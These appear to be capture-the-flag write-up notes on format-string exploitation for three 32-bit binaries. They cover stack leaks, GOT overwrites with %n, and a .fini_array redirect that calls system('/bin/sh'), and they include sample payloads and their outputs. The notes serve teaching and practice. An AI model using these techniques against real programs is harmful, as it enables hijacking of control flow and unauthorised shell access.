# Format strings

* bbppwn

    32 bits, LSB, intel 80386. Sec: NX and partial RELRO.

    Asks user for a name, then displays it.

    The sprintf does not specify a format, so we'll use this to overwrite the got table, so that a call to a libc method will call something else instead.

    First explore the memory layout:
    ```
    Hello baby pwner, whats your name?
    000011114444.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
    Ok cool, soon we will know whether you pwned it or not. Till then Bye 000011114444.8048914.ffc0fd08.f7f74d50.f7f74400.f7f86e56.1.ffc0ffb4.f7b9d2cc.39c.30303030.31313131.34343434.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78
    ```
    The `30303030.31313131.34343434` part corresponds to the input. Again, with different syntax:
    ```
    Hello baby pwner, whats your name?
    000011112222.%10$x.%11$x.%12$x            
    Ok cool, soon we will know whether you pwned it or not. Till then Bye 000011112222.30303030.31313131.32323232
    ```

    The entry of fflush in the got table is at `0x0804a028`. We will replace its content with `0x0804870b` which is a method to display the flag.

    Tricky part was to compute the right offset of bytes to send to write the value we want. Also, the order in which we send the formatting chunks is important (duh!).

* echo

    32bits, LSB, intel 80386, NX enabled. Ask for input and display the entered value. No safeguards against format strings (e.g. `%x`).

    The flag is stored in a buffer that is adjacent to the one that will hold user's input. So probably make the pointer to the user's input points to the flag.

    With brute forcing I was able to get the flag:
    ```
    Time to learn about Format Strings!
    We will evaluate any format string you give us with printf().
    See if you can get the flag!
    > lala.%x
    lala.40
    > lala.%x.%x
    lala.40.f7eb1580
    > lala.%x.%x.%s
    lala.40.f7eb1580.��l�������l�����l�����l����y�������j@j
    > lala.%x.%x.%x.%s
    lala.40.f7eb1580.8048647.__libc_start_main
    > lala.%x.%x.%x.%s.%x
    lala.40.f7eb1580.8048647.__libc_start_main.f7edd6dd
    > lala.%x.%x.%x.%s.%s
    lala.40.f7eb1580.8048647.__libc_start_main.��0��t���$�
    > lala.%x.%x.%x.%s.%x.%x
    lala.40.f7eb1580.8048647.__libc_start_main.f7edd6dd.8048248
    > lala.%x.%x.%x.%s.%x.%s
    lala.40.f7eb1580.8048647.__libc_start_main.f7edd6dd.e
    > lala.%x.%x.%x.%s.%x.%x.%x
    lala.40.f7eb1580.8048647.__libc_start_main.f7edd6dd.8048248.ffa818a4
    > lala.%x.%x.%x.%s.%x.%x.%s
    lala.40.f7eb1580.8048647.__libc_start_main.f7edd6dd.8048248.�0��
    > lala.%x.%x.%x.%s.%x.%x.%x.%x
    lala.40.f7eb1580.8048647.__libc_start_main.f7edd6dd.8048248.ffa818a4.ffa817ac
    > lala.%x.%x.%x.%s.%x.%x.%x.%s
    lala.40.f7eb1580.8048647.__libc_start_main.f7edd6dd.8048248.ffa818a4.flag{tralala}
    ```

    For a (slightly) more elegant way I could print the memory layout:
    ```
    > lala.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
    lala.40.f7fb0580.8048647.804832d.f7fdc6dd.8048248.ffffcfa4.ffffceac.3e8.804b1a0.616c616c.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.0x08048754
    ```
    Then look for the one corresponding to the flag (`search-pattern` to find that the flag is at 0xffffceac in this example) -> here it is the 8th.

    So `%8$s` should suffice.

* greetings

    32 bits LSB, canary + NX. Asks for name and greets it. Of course the format is not checked/specified, so we can pass `%x`s.

    No method that contains the flag -> open a shell ?

    Nice system method imported:
    ```
                            PTR_system_08049a48                             XREF[1]:     system:08048490  
    08049a48 14 a0 04 08     addr       system                                           = ??
    ```
    `0x08048490` in the plt table.

    There are no space after getting the user input, only a canary check. So we'll overwrite the `.fini._array` (at `0x08049934`) to loop back at the call to `getnline` method (at `0x8048614`), in which the called methods will be switched with ours.

    We can overwrite the strlen method with the system call. We can see it here:
    ```
    objdump -R greeting | grep strlen
    08049a54 R_386_JUMP_SLOT   strlen@GLIBC_2.0
    ```

    Now to find the buffer location relative to the format string:
    ```
    Hello, I'm nao!
    Please tell me your name... 00111122223333.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
    Nice to meet you, 00111122223333.80487d0.ff8325fc.0.0.0.0.6563694e.206f7420.7465656d.756f7920.3030202c.31313131.32323232.33333333.2e78252e.252e7825. :)
    ```
    So we can see part of 11th byte, then 12 to 14 -> 00111122223333.%12$x.%13$x.%14$x

    As for the printf overwrite, the default value seems to be 0x24, so tweak value of `%ix` to have the right offset.

    It seems I have a hard time visualizing the right method to compute the right offset. Let's say I have `0x8490`, and I want `0x0804` instead. All I need is `0x8490 + x = 0x0804` -> `x = 0x10804 - 0x8490` (I added a `1` on top of the `0x0804` to compute positive value, we don't care about the carry).

    So the walkthrough is as follows:
    1. divert the end of the program (`.fini_array`) to loop back at the middle of our program.
    2. get a user input ("/bin/sh").
    3. call strlen, which is now diverted to a call to `system` -> open a shell

# Potential attack vectors

## Format  unspecified

Forgetting the format (e.g. `%s`, `%d` etc) will allow an attacker to specify himself the format. Most interesting is the `%n` identifier that lets attacker specify the number of characters written by the printf (!).

## Change method entry

The executable has tables listing methods' addresses. Why not overwriting them with addresses of our choice ? Interesting tables being:
* `.got.plt`: Global Offset Table, Procedure Linkage Table. For dynamic linking, to make the link between the internal representation of a method and its actual implementation, loaded by `ld.so`.
* `.fini_array`: methods called at the end of the program (even after the `return` of the main !).